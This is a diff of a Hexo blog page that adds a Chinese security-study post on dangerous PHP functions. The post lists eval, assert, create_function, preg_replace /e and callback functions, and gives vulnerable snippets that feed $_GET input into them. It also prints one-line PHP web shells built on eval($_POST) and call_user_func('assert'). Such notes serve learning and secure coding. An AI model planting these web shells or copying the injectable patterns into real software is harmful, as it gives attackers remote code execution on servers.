@@ -4,8 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="article title, Hexo">
-    <meta name="description" content="article title | Hexo">
+    <meta name="keywords" content="PHP危险函数总结, Hexo">
+    <meta name="description" content="php危险函数总结什么是危险函数函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。
+$_GET ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +14,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>article title | Hexo</title>
+    <title>PHP危险函数总结 | Hexo</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -303,12 +304,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">article title</h1>
+                    <h1 class="description center-align post-title">PHP危险函数总结</h1>
                 </div>
             </div>
         </div>
@@ -437,7 +438,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-03-02
+                    2020-03-12
                 </div>
                 
 
@@ -446,7 +447,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    0
+                    749
                 </div>
                 
 
@@ -459,7 +460,186 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                
+                <h2 id="php危险函数总结"><a href="#php危险函数总结" class="headerlink" title="php危险函数总结"></a>php危险函数总结</h2><h5 id="什么是危险函数"><a href="#什么是危险函数" class="headerlink" title="什么是危险函数"></a>什么是危险函数</h5><p>函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。</p>
+<pre><code>$_GET            
+$POST
+$_fILES
+$_COOKIE
+$_REQUEST        
+$_SERVER        
+$_SESSION    </code></pre><h4 id="执行任意代码的函数"><a href="#执行任意代码的函数" class="headerlink" title="执行任意代码的函数"></a>执行任意代码的函数</h4><ul>
+<li>eval函数</li>
+<li>assert函数</li>
+<li>create_function 函数</li>
+<li>preg_replace 函数</li>
+<li>call_user_func/call_user_func_array函数</li>
+<li>array_map函数</li>
+<li>array_filter函数</li>
+<li>usort/uasort函数</li>
+<li>$a($b)动态函数</li>
+</ul>
+<h5 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h5><p>eval() 函数把字符串按照 PHP 代码来计算。</p>
+<p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p>
+<p><strong>注释：</strong>return 语句会立即终止对字符串的计算。</p>
+<p><strong>提示：</strong>该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。</p>
+<pre><code>&lt;?php
+$string = &quot;beautiful&quot;;
+$time = &quot;winter&quot;;
+$str = &#39;This is a $string $time morning!&#39;;
+eval(&quot;\$str = \&quot;$str\&quot;;&quot;);
+echo $str;
+
+输出为：This is a beautiful winter morning! </code></pre><p><strong>简单的一句话木马：</strong><?php eval($_POST['CMD']);?></p>
+<h5 id="assert函数"><a href="#assert函数" class="headerlink" title="assert函数"></a>assert函数</h5><p>assert——检测一个 断言是否为FALSE</p>
+<p>如果参数为字符串，它将会被assert()当做php代码来执行</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token keyword">function</span> fo<span class="token punctuation">{</span>
+    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string">"shell.php"</span><span class="token punctuation">,</span> <span class="token string">"&lt;?php phpinfo() ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token function">assert</span><span class="token punctuation">(</span><span class="token string">"$func()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>如果我们提交?func=fo，即可写入shell.php</p>
+<h5 id="create-function函数"><a href="#create-function函数" class="headerlink" title="create_function函数"></a>create_function函数</h5><p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p>
+<p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$str2</span><span class="token operator">=</span><span class="token string">'echo'</span><span class="token punctuation">.</span><span class="token variable">$a</span><span class="token punctuation">.</span><span class="token string">'"test"'</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">";"</span><span class="token punctuation">;</span>
+
+<span class="token variable">$f1</span> <span class="token operator">=</span> <span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string">'$a'</span><span class="token punctuation">,</span> <span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$f1</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CPictures%5CQQ%E6%88%AA%E5%9B%BE20200218123543.png" alt=""></p>
+<h5 id="代码执行漏洞常见种类"><a href="#代码执行漏洞常见种类" class="headerlink" title="代码执行漏洞常见种类"></a>代码执行漏洞常见种类</h5><ul>
+<li><strong>create_function函数</strong></li>
+</ul>
+<p>create_function(string $args, string $code)</p>
+<p>适用范围：<code>PHP 4&gt; = 4.0.1</code>，<code>PHP 5</code>，<code>PHP 7</code></p>
+<p>功能：根据传递的参数创建匿名函数，并为其返回唯一名称。</p>
+<pre><code>&lt;?php
+
+$id=$_GET[&#39;id&#39;];
+
+$str2=&#39;echo&#39;.$a.&#39;&quot;test&quot;&#39;.$id.&quot;;&quot;;
+
+$f1 = create_function(&#39;$a&#39;, $str2);
+
+$f1(&quot;abc&quot;);
+?&gt;</code></pre><p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CPictures%5CQQ%E6%88%AA%E5%9B%BE20200218123543.png" alt=""></p>
+<ul>
+<li><strong>preg_replace函数</strong></li>
+</ul>
+<p>preg_replace($pattern,$replacement,$subject,$limit,$count)</p>
+<p>示例1：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/test/e"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"a"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"this is a test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p>当我们所要匹配的字符串中含有test时</p>
+<p>我们直接传入参数？a=phpinfo()即可执行代码。</p>
+<p>示例2：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token variable">$str</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span><span class="token punctuation">,</span> <span class="token string">'test("\1")'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"h"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CPictures%5CQQ%E6%88%AA%E5%9B%BE20200218125837.png" alt=""></p>
+<ul>
+<li><strong>call_user_func/call_user_func_array函数</strong></li>
+</ul>
+<p>call_user_func($callback,$parameter)</p>
+<p>调用一个回调函数处理字符串,</p>
+<p>call_user_func_array($callback,$param arr)</p>
+<p>利用回调函数处理数组。</p>
+<p><strong>示例1：</strong></p>
+<img src="C:\Users\尚慧亮\Pictures\QQ截图20200218130741.png" style="zoom:80%;" />
+
+<img src="C:\Users\尚慧亮\Pictures\QQ截图20200218130753.png" style="zoom:67%;" />
+
+<p><strong>示例2：</strong></p>
+<p>一句话木马：</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+@<span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token string">"assert"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<p><img src="C:%5CUsers%5C%E5%B0%9A%E6%85%A7%E4%BA%AE%5CPictures%5CQQ%E6%88%AA%E5%9B%BE20200218131820.png" alt=""></p>
+<ul>
+<li>array_map函数</li>
+</ul>
+<p>array_map（$callback,$array1)</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"func"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$array</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$cmd</span><span class="token punctuation">;</span>
+
+<span class="token variable">$new_array</span><span class="token operator">=</span><span class="token function">array_map</span><span class="token punctuation">(</span><span class="token variable">$func</span><span class="token punctuation">,</span><span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+ <img src="C:\Users\尚慧亮\Pictures\QQ截图20200218133234.png" style="zoom: 67%;" />
+
+
+
+<ul>
+<li><strong>array_filter函数</strong></li>
+</ul>
+<p>array_filter($array,$callback)</p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token variable">$array1</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$func</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+<span class="token function">array_filter</span><span class="token punctuation">(</span><span class="token variable">$array1</span><span class="token punctuation">,</span><span class="token variable">$func</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span></code></pre>
+<img src="C:\Users\尚慧亮\Pictures\QQ截图20200218202542.png" style="zoom:67%;" />
+
+<ul>
+<li><p><strong>usort/uasort函数</strong></p>
+<p>usort(array, cmp_function)；</p>
+<p>uasort(array, cmp_function)；</p>
+</li>
+<li><p><strong>$a$b动态函数</strong></p>
+</li>
+</ul>
+<h4 id="读取网络资源的函数"><a href="#读取网络资源的函数" class="headerlink" title="读取网络资源的函数"></a>读取网络资源的函数</h4><p>常见的php读取远程文件的方式</p>
+<ul>
+<li><p><strong>Fopen()</strong></p>
+<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+<span class="token variable">$handle</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span>"http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//www.baidu.com","rb");</span>
+<span class="token variable">$contents</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">;</span>
+<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token variable">$contents</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">,</span> <span class="token number">8192</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">}</span>
+<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$handle</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token variable">$contents</span><span class="token punctuation">;</span>
+<span class="token delimiter">?></span>
+</code></pre>
+</li>
+</ul>
+<ul>
+<li><strong>file_get_content()</strong></li>
+</ul>
+<ul>
+<li><strong>curl</strong></li>
+</ul>
+<h4 id="操作文件的函数"><a href="#操作文件的函数" class="headerlink" title="操作文件的函数"></a>操作文件的函数</h4><p>常见文件操作函数</p>
+<ul>
+<li><strong>Copy()</strong></li>
+<li><strong>File_get_contents()/File_put_contents</strong></li>
+<li><strong>File()</strong></li>
+<li><strong>Fopen()</strong></li>
+<li><strong>Move_uploaded_file()</strong></li>
+<li><strong>Readfile()</strong></li>
+<li><strong>Rename()</strong></li>
+<li><strong>Rmdir()</strong></li>
+<li><strong>Unlink()</strong></li>
+</ul>
+
             </div>
             <hr/>
 
@@ -484,7 +664,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://shu1l.github.io/2020/03/02/article-title/">https://shu1l.github.io/2020/03/02/article-title/</a>
+                    <a href="https://shu1l.github.io/2020/03/12/php-wei-xian-han-shu-zong-jie/">https://shu1l.github.io/2020/03/12/php-wei-xian-han-shu-zong-jie/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -689,20 +869,19 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2020/03/12/php-wei-xian-han-shu-zong-jie/">
+                <a href="/2020/03/12/sql-zhu-ru-zhi-shi-dian-zong-jie-ba-chang-bi-ji/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="PHP危险函数总结">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="SQL注入知识点总结+靶场笔记">
                         
-                        <span class="card-title">PHP危险函数总结</span>
+                        <span class="card-title">SQL注入知识点总结+靶场笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            php危险函数总结什么是危险函数函数设计出来就是让人使用的，之所以危险，是因为其功能过于强大。开发人员特别是刚从业的人员很少很少会完整阅读整个文档，再或者是没有意识到当给这些函数传递一些非常规的，外部可控的参数会带来什么影响。
-$_GET 
+                            SQL注入漏洞学习笔记+靶场总结mysql相关知识点Mysql 5.x数据结构​      在Mysql5.0以上的版本中，为了方便管理，默认定义了information_schema数据库，用来存储数据库元信息。其中具有表schemata
                         
                     </div>
                     <div class="publish-info">
@@ -727,19 +906,19 @@ $_GET
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/03/02/hello-world/">
+                <a href="/2020/03/02/article-title/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="article title">
                         
-                        <span class="card-title">Hello World</span>
+                        <span class="card-title">article title</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
+                            
                         
                     </div>
                     <div class="publish-info">
